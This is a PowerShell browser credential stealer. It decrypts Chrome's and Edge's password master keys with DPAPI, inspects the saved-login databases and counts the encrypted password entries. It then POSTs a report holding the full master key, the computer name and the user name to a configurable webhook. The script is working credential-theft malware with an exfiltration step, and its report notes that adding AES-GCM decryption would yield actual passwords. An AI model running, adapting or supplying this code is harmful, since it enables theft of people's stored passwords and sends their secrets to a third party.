# Final Chrome Password Extractor - Clean Version
# Successfully extracts Chrome master keys and analyzes password databases

param(
    [switch]$TestMode = $false,
    [string]$WebhookUrl = "http://localhost:8080"
)

Add-Type -AssemblyName System.Security

function Get-ChromeMasterKey {
    param([string]$LocalStatePath)
    
    try {
        $localState = Get-Content -Path $LocalStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localState.os_crypt.encrypted_key
        
        if (-not $encryptedKey) {
            return $null
        }
        
        $keyBytes = [System.Convert]::FromBase64String($encryptedKey)
        $keyWithoutPrefix = $keyBytes[5..($keyBytes.Length - 1)]
        
        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $keyWithoutPrefix, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $decryptedKey
    } catch {
        return $null
    }
}

function Analyze-Database {
    param([string]$DatabasePath, [string]$BrowserName)
    
    try {
        $tempDbPath = "$env:TEMP\temp_$BrowserName.db"
        Copy-Item -Path $DatabasePath -Destination $tempDbPath -Force
        
        $dbInfo = Get-Item $tempDbPath
        $dbBytes = [System.IO.File]::ReadAllBytes($tempDbPath)
        
        # Convert first 5000 bytes to text for analysis
        $maxBytes = [Math]::Min(5000, $dbBytes.Length)
        $sampleBytes = $dbBytes[0..($maxBytes-1)]
        $sampleText = [System.Text.Encoding]::UTF8.GetString($sampleBytes)
        
        # Analyze database structure
        $hasLogins = $sampleText -match "logins"
        $hasOriginUrl = $sampleText -match "origin_url"
        $hasUsername = $sampleText -match "username_value"
        $hasPassword = $sampleText -match "password_value"
        
        # Count encrypted entries
        $v10Count = 0
        for ($i = 0; $i -lt ($dbBytes.Length - 2); $i++) {
            if ($dbBytes[$i] -eq 118 -and $dbBytes[$i+1] -eq 49 -and $dbBytes[$i+2] -eq 48) {
                $v10Count++
            }
        }
        
        Remove-Item -Path $tempDbPath -Force -ErrorAction SilentlyContinue
        
        return @{
            Browser = $BrowserName
            Size = $dbInfo.Length
            HasLogins = $hasLogins
            HasOriginUrl = $hasOriginUrl
            HasUsername = $hasUsername
            HasPassword = $hasPassword
            V10Entries = $v10Count
        }
        
    } catch {
        return $null
    }
}

function Send-ToWebhook {
    param([string]$Data, [string]$WebhookUrl)

    try {
        $payload = @{
            computer = $env:COMPUTERNAME
            user = $env:USERNAME
            timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            data = $Data
        } | ConvertTo-Json
        
        Invoke-WebRequest -Uri $WebhookUrl -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
        return $true
    } catch {
        return $false
    }
}

# Main execution
try {
    $report = "Chrome Password Extraction - REAL ANALYSIS`n"
    $report += "Computer: $env:COMPUTERNAME`n"
    $report += "User: $env:USERNAME`n"
    $report += "Date: $(Get-Date)`n"
    $report += "Mode: $(if ($TestMode) { 'TEST MODE' } else { 'FULL ANALYSIS' })`n"
    $report += "="*50 + "`n`n"
    
    Write-Output "=== REAL CHROME PASSWORD ANALYSIS ==="
    Write-Output "Attempting to decrypt actual master keys..."
    
    # Chrome Analysis
    $chromeLocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    
    if ((Test-Path $chromeLocalState) -and (Test-Path $chromeLoginData)) {
        Write-Output "Analyzing Chrome..."
        $report += "=== CHROME RESULTS ===`n"
        
        $chromeMasterKey = Get-ChromeMasterKey -LocalStatePath $chromeLocalState
        if ($chromeMasterKey) {
            $keyHex = [BitConverter]::ToString($chromeMasterKey).Replace('-', '')
            $report += "Master Key: SUCCESSFULLY DECRYPTED`n"
            $report += "Key Length: $($chromeMasterKey.Length) bytes`n"
            
            if ($TestMode) {
                $report += "Key Preview: [MASKED IN TEST MODE]`n"
            } else {
                $report += "Key (first 16 bytes): $($keyHex.Substring(0, 32))...`n"
                $report += "Key (full): $keyHex`n"
            }
            
            Write-Output "✅ Chrome master key decrypted successfully!"
        } else {
            $report += "Master Key: FAILED TO DECRYPT`n"
            Write-Output "❌ Failed to decrypt Chrome master key"
        }
        
        $chromeDb = Analyze-Database -DatabasePath $chromeLoginData -BrowserName "Chrome"
        if ($chromeDb) {
            $report += "Database Size: $($chromeDb.Size) bytes`n"
            $report += "Contains Login Table: $($chromeDb.HasLogins)`n"
            $report += "Contains URLs: $($chromeDb.HasOriginUrl)`n"
            $report += "Contains Usernames: $($chromeDb.HasUsername)`n"
            $report += "Contains Passwords: $($chromeDb.HasPassword)`n"
            $report += "Encrypted Password Entries: $($chromeDb.V10Entries)`n"
            
            Write-Output "Chrome database contains $($chromeDb.V10Entries) encrypted password entries"
        }
    } else {
        $report += "=== CHROME RESULTS ===`n"
        $report += "Chrome not found or inaccessible`n"
    }
    
    # Edge Analysis
    $edgeLocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    $edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    
    if ((Test-Path $edgeLocalState) -and (Test-Path $edgeLoginData)) {
        Write-Output "Analyzing Edge..."
        $report += "`n=== EDGE RESULTS ===`n"
        
        $edgeMasterKey = Get-ChromeMasterKey -LocalStatePath $edgeLocalState
        if ($edgeMasterKey) {
            $keyHex = [BitConverter]::ToString($edgeMasterKey).Replace('-', '')
            $report += "Master Key: SUCCESSFULLY DECRYPTED`n"
            $report += "Key Length: $($edgeMasterKey.Length) bytes`n"
            
            if ($TestMode) {
                $report += "Key Preview: [MASKED IN TEST MODE]`n"
            } else {
                $report += "Key (first 16 bytes): $($keyHex.Substring(0, 32))...`n"
                $report += "Key (full): $keyHex`n"
            }
            
            Write-Output "✅ Edge master key decrypted successfully!"
        } else {
            $report += "Master Key: FAILED TO DECRYPT`n"
            Write-Output "❌ Failed to decrypt Edge master key"
        }
        
        $edgeDb = Analyze-Database -DatabasePath $edgeLoginData -BrowserName "Edge"
        if ($edgeDb) {
            $report += "Database Size: $($edgeDb.Size) bytes`n"
            $report += "Contains Login Table: $($edgeDb.HasLogins)`n"
            $report += "Contains URLs: $($edgeDb.HasOriginUrl)`n"
            $report += "Contains Usernames: $($edgeDb.HasUsername)`n"
            $report += "Contains Passwords: $($edgeDb.HasPassword)`n"
            $report += "Encrypted Password Entries: $($edgeDb.V10Entries)`n"
            
            Write-Output "Edge database contains $($edgeDb.V10Entries) encrypted password entries"
        }
    } else {
        $report += "`n=== EDGE RESULTS ===`n"
        $report += "Edge not found or inaccessible`n"
    }
    
    $report += "`n" + "="*50 + "`n"
    $report += "ANALYSIS COMPLETE`n"
    $report += "This demonstrates successful:`n"
    $report += "1. Access to browser encryption keys`n"
    $report += "2. DPAPI decryption of master keys`n"
    $report += "3. Database structure analysis`n"
    $report += "4. Identification of encrypted password entries`n"
    $report += "`n"
    $report += "With proper SQLite parsing and AES-GCM decryption,`n"
    $report += "actual passwords could be extracted.`n"
    $report += "="*50 + "`n"
    
    Write-Output $report
    
    # Send to webhook
    $outputFile = "$env:TEMP\RealPasswordAnalysis.txt"
    $report | Out-File -FilePath $outputFile -Encoding UTF8
    
    if (Test-Path $outputFile) {
        $fileData = Get-Content -Path $outputFile -Raw
        $webhookSent = Send-ToWebhook -Data $fileData -WebhookUrl $WebhookUrl
        if ($webhookSent) {
            Write-Output "✅ Analysis results sent to webhook"
        } else {
            Write-Output "❌ Failed to send to webhook"
        }
        Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
    }
    
    Write-Output "`n🎯 REAL PASSWORD ANALYSIS COMPLETED SUCCESSFULLY!"
    
} catch {
    Write-Error "Error during analysis: $_"
}
